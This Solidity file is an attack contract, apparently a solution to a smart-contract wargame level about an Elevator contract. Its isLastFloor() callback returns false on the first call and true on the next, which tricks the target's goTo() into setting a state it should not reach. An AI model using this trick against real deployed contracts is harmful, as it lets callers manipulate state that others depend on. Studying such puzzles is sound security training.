pragma solidity ^0.6.0;

interface Elevator {
      function goTo(uint) external;
}

contract Building {
    Elevator public elevatorInstance;
    uint256 public count = 0;

    constructor (address _elevatorAddress) public {
        elevatorInstance = Elevator(_elevatorAddress);
    }

    function isLastFloor(uint _floor) public returns (bool) {
        count+=1;
        if (count % 2 != 0) {
            return false;
        } else {
            return true;
        }
    }

    function attack(uint256 _floor) public {
        require(_floor > 0, "floor should not be '0'");
        elevatorInstance.goTo(_floor);
    }
}